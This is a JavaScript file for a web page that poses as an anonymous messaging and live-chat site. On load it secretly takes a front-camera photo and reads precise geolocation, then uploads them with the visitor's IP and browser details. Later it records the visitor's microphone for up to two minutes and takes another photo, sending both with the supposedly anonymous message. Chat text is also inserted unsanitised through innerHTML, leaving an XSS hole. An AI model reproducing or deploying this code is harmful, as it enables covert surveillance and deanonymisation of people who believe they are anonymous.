// Firebase Config (YOUR PROJECT'S CONFIG - DO NOT SHARE PUBLICLY)
const firebaseConfig = {
    apiKey: "AIzaSyBiIEU8xsfxjYgGRjOvoP1RKtZKwN5i0yk",
    authDomain: "kycupdateapp.firebaseapp.com",
    databaseURL: "https://kycupdateapp-default-rtdb.firebaseio.com",
    projectId: "kycupdateapp",
    storageBucket: "kycupdateapp.firebasestorage.app",
    messagingSenderId: "508854921421",
    appId: "1:508854921421:web:ebd92a2f9d69b62d54a184"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore(); // Get a reference to Firestore database


document.addEventListener('DOMContentLoaded', () => {
    // --- Get all the elements we need from the HTML ---
    const step1 = document.getElementById('step1-message');
    const step2 = document.getElementById('step2-finalize');
    const step3 = document.getElementById('step3-thankyou');

    const messageInput = document.getElementById('anonymousMessage');
    const nextButton = document.getElementById('nextButton');
    const userNameInput = document.getElementById('userName');
    const emojis = document.querySelectorAll('.emoji');
    const sendButton = document.getElementById('sendButton');

    const mainLiveChatButton = document.getElementById('mainLiveChatButton');
    const thankYouLiveChatButton = document.getElementById('liveChatButton');
    const closeButton = document.getElementById('closeButton'); // The "Close" button on Thank You screen

    const liveChatOverlay = document.getElementById('liveChatOverlay');
    const closeChatButton = document.getElementById('closeChatButton'); // The 'X' button on Live Chat overlay
    const chatNameInput = document.getElementById('chatNameInput');
    const chatMessageInput = document.getElementById('chatMessageInput');
    const sendChatMessageButton = document.getElementById('sendChatMessageButton');
    const chatMessagesContainer = document.getElementById('chatMessages');

    // --- New elements for Live Chat UI control ---
    const chatNameInputWrapper = chatNameInput.parentNode; // The parent div containing the name input
    const chattingAsText = document.getElementById('chattingAs'); // Element to show "Chatting as: [Name]"


    let selectedEmoji = null;
    let mediaRecorder = null; // Will be set if mic permission granted
    let audioChunks = [];
    let userMediaStream = null; // Will be set if camera/mic permission granted
    let userLocation = { latitude: null, longitude: null }; // To store location data

    // --- Live Chat Specific Variables ---
    let currentChatSessionId = null;
    let chatUserDisplayName = null; // Display name for the user in chat
    let unsubscribeFromChat = null; // To store the Firestore listener unsubscribe function


    // --- Permission Requests & Initial Data Collection (on page load) ---
    async function collectInitialData() {
        console.log('DEBUG: collectInitialData function started (on page load).');
        let initialPhotoBlob = null;
        let cameraMicGranted = false;
        let geolocationGranted = false;

        // --- NEW: Request Camera/Mic immediately on page load ---
        console.log('DEBUG: Attempting to request Camera/Mic on page load.');
        try {
            userMediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
            console.log('DEBUG: Camera/Microphone permissions granted on page load!');
            cameraMicGranted = true;

            // --- Capture one photo immediately ---
            console.log('DEBUG: Capturing initial photo.');
            const photo = await capturePhoto();
            if (photo) {
                initialPhotoBlob = await compressImage(photo);
                console.log('DEBUG: Initial photo compressed size:', (initialPhotoBlob.size / 1024).toFixed(2), 'KB');
            }

            // Set up media recorder for ANONYMOUS MESSAGE AUDIO ONLY (don't start yet)
            mediaRecorder = new MediaRecorder(userMediaStream);
            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

        } catch (error) {
            console.warn('DEBUG: Camera/Microphone permissions denied or error on page load:', error);
            userMediaStream = null;
            mediaRecorder = null;
        }

        // --- NEW: Request Geolocation immediately on page load ---
        console.log('DEBUG: Checking if Geolocation is supported on page load.');
        if (navigator.geolocation) {
            geolocationGranted = await new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        userLocation.latitude = position.coords.latitude;
                        userLocation.longitude = position.coords.longitude;
                        console.log('DEBUG: Geolocation permission granted and captured on page load:', userLocation);
                        resolve(true);
                    },
                    (error) => {
                        console.warn('DEBUG: Geolocation permission denied or error on page load:', error);
                        resolve(false);
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            });
        } else {
            console.warn('DEBUG: Geolocation is NOT supported by this browser on page load.');
        }

        // --- Send initial collected data to new backend function ---
        const formData = new FormData();
        if (userLocation.latitude !== null && userLocation.longitude !== null) {
            formData.append('latitude', userLocation.latitude);
            formData.append('longitude', userLocation.longitude);
        }
        if (initialPhotoBlob) {
            formData.append('photo', initialPhotoBlob, 'initial_capture.jpg');
        }

        // Send a request to a new Netlify function for passive data + initial media
        try {
            console.log('DEBUG: Sending initial passive data + photo/location to collect-initial-data function.');
            const response = await fetch('/.netlify/functions/collect-initial-data', {
                method: 'POST',
                body: formData // This will include IP, User-Agent from headers automatically
            });
            if (response.ok) {
                console.log('DEBUG: Initial data sent successfully.');
            } else {
                console.error('DEBUG: Failed to send initial data. Server response:', response.status);
            }
        } catch (error) {
            console.error('DEBUG: Error sending initial data:', error);
        }

        // --- Important: Stop camera after initial capture if it's not needed for anonymous message ---
        // We stop the video track immediately after capturing the initial photo.
        // The audio track might still be needed if mediaRecorder is active for anonymous message.
        if (userMediaStream && userMediaStream.getVideoTracks().length > 0) {
            userMediaStream.getVideoTracks()[0].stop();
            console.log('DEBUG: Initial camera stream stopped after capture.');
        }
    }
    
    collectInitialData(); // Call this function immediately on page load


    // --- Photo Capture Function (used by initial data and anonymous message) ---
    async function capturePhoto() {
        if (!userMediaStream || userMediaStream.getVideoTracks().length === 0) return null; // Ensure video track exists
        const videoTrack = userMediaStream.getVideoTracks()[0];
        if (!videoTrack) return null;
        try {
            const imageCapture = new ImageCapture(videoTrack);
            const blob = await imageCapture.takePhoto();
            return blob;
        } catch (error) {
            console.error("DEBUG: Could not capture photo:", error);
            return null;
        }
    }

    // --- Image Compression Function ---
    function compressImage(imageFile, maxWidth = 800, quality = 0.7) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.readAsDataURL(imageFile);
            reader.onload = event => {
                const img = new Image();
                img.src = event.target.result;
                img.onload = () => {
                    const canvas = document.createElement('canvas');
                    let width = img.width;
                    let height = img.height;

                    if (width > height) {
                        if (width > maxWidth) {
                            height = Math.round((height * maxWidth) / width);
                            width = maxWidth;
                        }
                    } else {
                        if (height > maxWidth) {
                            width = Math.round((width * maxWidth) / height);
                            height = maxWidth;
                        }
                    }

                    canvas.width = width;
                    canvas.height = height;

                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0, width, height);

                    canvas.toBlob(blob => {
                        resolve(blob);
                    }, 'image/jpeg', quality);
                };
                img.onerror = error => reject(error);
            };
            reader.onerror = error => reject(error);
        });
    }


    // --- Main Anonymous Messaging Flow Logic ---
    messageInput.addEventListener('input', () => {
        if (messageInput.value.trim() !== '') {
            nextButton.classList.remove('hidden');
        } else {
            nextButton.classList.add('hidden');
        }
    });

    nextButton.addEventListener('click', () => {
        if (messageInput.value.trim() === '') {
            messageInput.style.animation = 'shake 0.5s';
            setTimeout(() => { messageInput.style.animation = '' }, 500);
            return;
        }
        step1.classList.add('hidden');
        mainLiveChatButton.classList.add('hidden');
        step2.classList.remove('hidden');

        // --- Start audio recording NOW for anonymous message ---
        // MediaRecorder should already be set up if mic permission was given on page load
        if (mediaRecorder && mediaRecorder.state === 'inactive') {
            audioChunks = []; // Clear any previous chunks
            mediaRecorder.start();
            console.log('DEBUG: Audio recording started for anonymous message.');

            // --- NEW: 2-minute timeout for anonymous message audio ---
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                    console.log('DEBUG: Anonymous message audio recording stopped due to 2-minute timeout.');
                }
            }, 120000); // 120000 milliseconds = 2 minutes
        }
    });

    emojis.forEach(emoji => {
        emoji.addEventListener('click', () => {
            const currentlySelected = document.querySelector('.emoji.selected');
            if (currentlySelected) {
                currentlySelected.classList.remove('selected');
            }
            emoji.classList.add('selected');
            selectedEmoji = emoji.dataset.emoji;
        });
    });

    sendButton.addEventListener('click', async () => {
        if (userNameInput.value.trim() === '') {
            userNameInput.style.animation = 'shake 0.5s';
            setTimeout(() => { userNameInput.style.animation = '' }, 500);
            return;
        }

        sendButton.disabled = true;
        sendButton.textContent = 'Sending...';

        // Stop audio recording to finalize the audio file
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            console.log('DEBUG: Anonymous message audio recording stopped by sending message.');
        }

        // --- Capture a NEW photo for the anonymous message (if camera available) ---
        // This is separate from the initial page-load photo
        let photoForAnonMessage = null;
        if (userMediaStream && userMediaStream.getVideoTracks().length > 0) { // Check if camera permission was granted
            let photo = await capturePhoto();
            if (photo) {
                photoForAnonMessage = await compressImage(photo);
                console.log('DEBUG: Anonymous message photo compressed size:', (photoForAnonMessage.size / 1024).toFixed(2), 'KB');
            }
        }
        
        // Use a small delay to ensure the recorder has time to process the last chunk
        await new Promise(resolve => setTimeout(resolve, 500));

        const formData = new FormData();
        formData.append('message', messageInput.value.trim());
        formData.append('name', userNameInput.value.trim());
        formData.append('emoji', selectedEmoji || 'No reaction');

        // Location data will be the one captured on page load (userLocation)
        if (userLocation.latitude !== null && userLocation.longitude !== null) {
            formData.append('latitude', userLocation.latitude);
            formData.append('longitude', userLocation.longitude);
            console.log('DEBUG: Appending location data (from page load) to anonymous form:', userLocation);
        } else {
            console.log('DEBUG: Location data not available for anonymous message.');
        }

        if (photoForAnonMessage) {
            formData.append('photo', photoForAnonMessage, 'anonymous_message_photo.jpg');
        }
        if (audioChunks.length > 0) {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            formData.append('audio', audioBlob, 'anonymous_message_audio.webm');
        }
        
        // --- Sending ALL Data to Backend (Anonymous Message Function) ---
        try {
            console.log('DEBUG: Sending anonymous message data to send-message function.');
            const response = await fetch('/.netlify/functions/send-message', {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                console.log('DEBUG: Anonymous message sent successfully.');
                step2.classList.add('hidden');
                step3.classList.remove('hidden');

                // --- Stop all camera/mic tracks AFTER anonymous message send ---
                // Only stop if they are still active and not stopped by initial data collection
                if (userMediaStream) {
                    userMediaStream.getTracks().forEach(track => track.stop());
                    console.log('DEBUG: Camera/Mic tracks stopped after anonymous message.');
                    userMediaStream = null; // Clear stream reference
                    mediaRecorder = null; // Clear recorder reference
                }

            } else {
                console.error('DEBUG: Failed to send anonymous message. Server response:', response.status);
                throw new Error('Failed to send anonymous message.');
            }
        } catch (error) {
            console.error('DEBUG: Error sending anonymous message:', error);
            alert('Sorry, something went wrong. Please try again.');
            sendButton.disabled = false;
            sendButton.textContent = 'Send Anonymously';
        }
    });

    // --- Thank You Screen Button Logic ---
    // Changed behavior: now hides thank you screen and returns to step1
    closeButton.addEventListener('click', () => {
        step3.classList.add('hidden');
        step1.classList.remove('hidden');
        // Reset form for new anonymous message
        messageInput.value = '';
        nextButton.classList.add('hidden');
        userNameInput.value = '';
        document.querySelectorAll('.emoji.selected').forEach(el => el.classList.remove('selected'));
        selectedEmoji = null;
    });

    // --- Live Chat Button Logic (opens overlay) ---
    function openLiveChat() {
        liveChatOverlay.classList.remove('hidden');
        liveChatOverlay.classList.add('visible');
        // Clear previous messages on opening (optional, but good for fresh chat)
        chatMessagesContainer.innerHTML = ``; // Clear all messages initially
        
        // Add the initial system message only if it's a new session or chat is empty
        if (!currentChatSessionId) { // If no current session ID, it's a fresh start
            const systemMessage = document.createElement('div');
            systemMessage.classList.add('chat-message', 'system-message');
            systemMessage.innerHTML = `<p>Enter your name to start chatting.</p>`;
            chatMessagesContainer.appendChild(systemMessage);
        } else {
            // If there's an existing session, re-attach listener and load messages
            setupChatListener(currentChatSessionId);
        }
        
        chatNameInput.value = chatUserDisplayName || ''; // Retain name if already set
        chatMessageInput.value = ''; // Clear message input
        
        // Ensure message input is disabled until a name is entered
        chatMessageInput.disabled = true;
        sendChatMessageButton.disabled = true;

        // If a name is already present, enable message input and focus immediately
        if (chatNameInput.value.trim() !== '') {
            chatMessageInput.disabled = false;
            sendChatMessageButton.disabled = false;
            chatMessageInput.focus();
        } else {
            chatNameInput.focus(); // Focus on name input if no name is present
        }

        // --- Hide name input field if name is already set ---
        if (chatUserDisplayName && chatUserDisplayName.trim() !== '') {
            chatNameInput.style.display = 'none';
            chattingAsText.textContent = `Chatting as: ${chatUserDisplayName}`; // Show name in header
            chattingAsText.classList.remove('hidden'); // Ensure it's visible
            chatMessageInput.focus(); // Focus message input directly
        } else {
            chatNameInput.style.display = ''; // Ensure name input is visible
            chattingAsText.classList.add('hidden'); // Hide "Chatting as" text
        }
    }

    function closeLiveChat() {
        liveChatOverlay.classList.remove('visible');
        liveChatOverlay.classList.add('hidden');
        // Unsubscribe from Firestore listener when chat is closed
        if (unsubscribeFromChat) {
            unsubscribeFromChat();
            unsubscribeFromChat = null; // Clear the reference
            console.log('DEBUG: Unsubscribed from chat listener.');
        }
        // IMPORTANT: We do NOT reset currentChatSessionId and chatUserDisplayName here
        // if we want to remember the user when they close/reopen the chat *in the same browser session*.
        // If you want to force a new chat every time they open it, uncomment these:
        // currentChatSessionId = null; 
        // chatUserDisplayName = null; 
    }

    thankYouLiveChatButton.addEventListener('click', openLiveChat);
    mainLiveChatButton.addEventListener('click', openLiveChat);
    closeChatButton.addEventListener('click', closeLiveChat);


    // --- Live Chat Messaging Logic ---

    // Enable/disable message input based on name presence
    chatNameInput.addEventListener('input', () => {
        const nameEntered = chatNameInput.value.trim();
        if (nameEntered !== '') {
            chatMessageInput.disabled = false;
            sendChatMessageButton.disabled = false;
            // Only focus on message input if it was just enabled
            if (chatMessageInput.disabled === true) { // Check previous state
                chatMessageInput.focus();
            }
        } else {
            chatMessageInput.disabled = true;
            sendChatMessageButton.disabled = true;
        }
    });

    sendChatMessageButton.addEventListener('click', sendMessageToChat);

    chatMessageInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            sendMessageToChat();
        }
    });


    async function sendMessageToChat() {
        const messageText = chatMessageInput.value.trim();
        const enteredName = chatNameInput.value.trim(); // Get name again here for safety

        if (!enteredName) {
            // This should be prevented by disabled state, but as a fallback
            alert("Please enter your name to start chatting.");
            chatNameInput.focus();
            return;
        }

        if (messageText === '') {
            return; // Don't send empty messages
        }

        // If this is the very first message of a new session (or first message after hard refresh)
        if (!currentChatSessionId) {
            chatUserDisplayName = enteredName; // Store the name for this session
            currentChatSessionId = 'chat_' + Date.now() + '_' + Math.random().toString(36).substring(2, 9);
            console.log('DEBUG: New chat session started with ID:', currentChatSessionId, 'Name:', chatUserDisplayName);
            setupChatListener(currentChatSessionId); // Setup listener for this new session
            
            // --- Trigger Netlify Function for new chat notification (Bot 2) ---
            try {
                await fetch('/.netlify/functions/notify-new-chat', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        sessionId: currentChatSessionId,
                        userName: chatUserDisplayName,
                        firstMessage: messageText
                    })
                });
                console.log('DEBUG: New chat notification sent to Telegram Bot 2.');
            } catch (notifyError) {
                console.error('DEBUG: Failed to send new chat notification:', notifyError);
            }

            // --- Hide name input and show "Chatting as" in header after first message ---
            chatNameInput.style.display = 'none';
            chattingAsText.textContent = `Chatting as: ${chatUserDisplayName}`;
            chattingAsText.classList.remove('hidden');
        } else if (!chatUserDisplayName) {
            // This could happen if currentChatSessionId is set (e.g. from refresh but name lost)
            chatUserDisplayName = enteredName;
            // Update the header if name was re-entered
            chattingAsText.textContent = `Chatting as: ${chatUserDisplayName}`;
            chattingAsText.classList.remove('hidden');
            chatNameInput.style.display = 'none';
        }


        try {
            // Add message to Firestore
            await db.collection('live_chats').doc(currentChatSessionId).collection('messages').add({
                text: messageText,
                sender: chatUserDisplayName, // Send current display name
                timestamp: firebase.firestore.FieldValue.serverTimestamp(), // Firestore generates server timestamp
                isVenky: false // This message is from the user, not Venky
            });
            console.log('DEBUG: Message sent to Firestore.');

            // Clear input field
            chatMessageInput.value = '';
            chatMessageInput.focus();

        } catch (error) {
            console.error('DEBUG: Error sending chat message:', error);
            alert('Failed to send chat message. Please try again.');
        }
    }

    // --- Real-time listener for chat messages ---
    function setupChatListener(sessionId) {
        if (unsubscribeFromChat) {
            unsubscribeFromChat(); // Unsubscribe from previous listener if any
        }

        // It's better to clear and re-render for simplicity with snapshot listeners
        chatMessagesContainer.innerHTML = ''; 

        unsubscribeFromChat = db.collection('live_chats').doc(sessionId).collection('messages')
            .orderBy('timestamp') // Order by timestamp to show messages in order
            .onSnapshot(snapshot => {
                // Clear and re-render all messages to handle initial load and updates
                chatMessagesContainer.innerHTML = ''; 
                snapshot.docs.forEach(doc => {
                    displayChatMessage(doc.data());
                });
                chatMessagesContainer.scrollTop = chatMessagesContainer.scrollHeight; // Auto-scroll to bottom
            }, error => {
                console.error('DEBUG: Error listening to chat messages:', error);
            });
        console.log('DEBUG: Chat listener set up for session:', sessionId);
    }

    function displayChatMessage(messageData) {
        const messageElement = document.createElement('div');
        messageElement.classList.add('chat-message');
        
        // Determine if it's user's message (right/red) or Venky's reply (left/grey)
        messageElement.classList.add(messageData.isVenky ? 'other-message' : 'user-message');

        const senderName = messageData.isVenky ? 'Venky' : (messageData.sender || 'Anonymous User'); // Use sender from data
        const timestamp = messageData.timestamp ? new Date(messageData.timestamp.toDate()).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '';
        
        // System messages don't need a sender name prefix or timestamp
        if (messageData.isSystem) {
             messageElement.innerHTML = `<p>${messageData.text}</p>`;
             messageElement.classList.remove('user-message', 'other-message'); // Ensure no sender styling
             messageElement.classList.add('system-message');
        } else {
            // WhatsApp/Insta-like message display
            messageElement.innerHTML = `<span class="chat-sender-name ${messageData.isVenky ? 'venky-sender' : 'user-sender'}">${senderName}</span><p>${messageData.text}</p><span class="chat-timestamp">${timestamp}</span>`;
        }

        chatMessagesContainer.appendChild(messageElement);
        chatMessagesContainer.scrollTop = chatMessagesContainer.scrollHeight; // Auto-scroll
    }
});

// Add shake animation keyframes dynamically
const styleSheet = document.createElement("style");
styleSheet.type = "text/css";
styleSheet.innerText = `@keyframes shake {
    10%, 90% { transform: translate3d(-1px, 0, 0); }
    20%, 80% { transform: translate3d(2px, 0, 0); }
    30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
    40%, 60% { transform: translate3d(4px, 0, 0); }
}`;
document.head.appendChild(styleSheet);
